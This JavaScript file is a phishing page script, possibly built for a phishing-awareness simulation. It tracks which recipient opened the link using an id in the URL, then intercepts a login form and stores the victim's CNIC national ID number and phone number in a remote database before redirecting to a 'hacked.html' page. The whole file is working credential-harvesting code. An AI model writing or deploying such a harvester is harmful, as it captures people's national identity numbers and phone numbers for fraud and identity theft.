const params = new URLSearchParams(window.location.search);
const userId = params.get("id") || "unknown";

// LOG 1: User clicked the link (page loaded)
window.addEventListener("load", function () {
    db.collection("logs").add({
        userId: userId,
        event: "link_clicked",
        timestamp: new Date().toISOString()
    })
    .then(() => console.log("Link click logged"))
    .catch(err => console.error(err));
});

// LOG 2: User submitted their credentials
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const cnic = document.getElementById("userCNIC").value;
    const phone = document.getElementById("userPhone").value;

    db.collection("logs").add({
        userId: userId,
        event: "form_submitted",
        cnic: cnic,
        phone: phone,
        timestamp: new Date().toISOString()
    })
    .then(() => {
        window.location.href = "hacked.html";
    })
    .catch(err => console.error(err));
});